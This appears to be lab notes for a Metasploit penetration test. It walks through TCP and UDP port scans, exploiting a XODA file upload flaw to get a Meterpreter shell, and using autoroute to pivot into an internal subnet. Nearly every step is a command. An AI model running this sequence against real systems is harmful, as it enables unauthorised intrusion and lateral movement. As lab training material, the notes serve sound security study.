ðŸ›¡ï¸ Metasploit Workflow Documentation
This document outlines a penetration testing workflow covering initial reconnaissance (port scanning), exploitation of a web application (XODA file upload), and post-exploitation session management and pivoting.

Phase 1: Environment Setup & Port Scanning
Objective: Set up the Metasploit environment and identify open ports on the target system.
Metasploit Setup

> ifconfig                                                   # Check your local IP (Attacker)
# Local IP: 192.86.140.2
# Target IP: 192.86.140.3
> service postgresql start                                   # Start the Metasploit database service
> msfconsole                                                 # Start Metasploit console
> db_status                                                  # Check database status
> workspace -a port_scan                                     # Create a new workspace
> search portscan                                            # Search for a port scanning module
> use auxiliary/scanner/portscan/tcp                         # Select the TCP port scanning auxiliary module. # OR: use 5 (if '5' is the index number)
> show options                                               # View configuration options
> set RHOSTS 192.86.140.3                                    # Set the target IP address
> set PORTS 1-65535                                          # Set the full port range
> run                                                        # Execute the scan
> back                                                       # Return to the main msfconsole prompt

Phase 2: Exploitation (XODA File Upload)
Objective: Utilize a web application vulnerability to gain initial access to the target system.
Exploit Configuration

> curl 192.86.140.3                                           # Verify the web application is running (optional check)
> search xoda                                                 # Search for the XODA file upload exploit
> use exploit/unix/webapp/xoda_file_upload                    # Select the exploit module
> show options                                                # View required options
> set RHOSTS 192.86.140.3                                     # Set the target IP
> set TARGETURI /                                             # Set the target web application path Gain Initial Access to the Target System
> exploit                                                     # Execute exploit
> sysinfo
> shell                                                       # Stabilize shell (if needed after getting a Meterpreter session)
> /bin/bash -i   

Phase 3: Post-Exploitation & Pivoting
Objective: Gather system and network information and set up a pivot route to an internal network.
Network Discovery and Shell Management

> ifconfig                                                      # Network discovery (from the target's shell)
# eth0 -> 192.86.140.3 (External)
# eth1 -> 192.113.124.2 (Internal/Pivot Point)
> background                                                    # Background the session (Return to Meterpreter prompt)
> background                                                    # Background the Meterpreter session (Return to msfconsole prompt)
> sessions                                                      # View active sessions
> run autoroute -s 192.113.124.0/24                             # Internal Network Pivoting--->Set up a route through the compromised system (Meterpreter) to access the internal network (192.113.124.0/24)
> run                                                           # Execute the routing command

Phase 4: Internal Reconnaissance
Objective: Scan a host on the newly accessible internal network (192.113.124.3) using the established pivot route.

> search portscan                                               # Internal Port Scan
> use auxiliary/scanner/portscan/tcp                            # Select the TCP port scanning auxiliary module
> show options                                                  # View options for configuration
> set RHOSTS 192.113.124.3                                      # Set the INTERNAL target IP address
                                                                # Traffic will route through the compromised host (pivot).
> run                                                           # Execute the internal scan
> back                                                          # Return to the main msfconsole prompt

ðŸ” UDP Port Scanning Module
Objective: Perform reconnaissance to identify open UDP ports on the external target system.
Metasploit Commands
# Note: 'udp_sweep' is a common auxiliary module for identifying open UDP ports

> search udp_sweep                                               # Search for UDP port scanning modules in the Metasploit database
> use use auxiliary/scanner/udp/udp_sweep                        # Select the appropriate module
> show options                                                   # View required and available configuration options
> set RHOSTS 192.86.140.3                                        # Set the target IP address
> run                                                            # Execute the UDP scan
> back                                                           # Return to the main msfconsole prompt
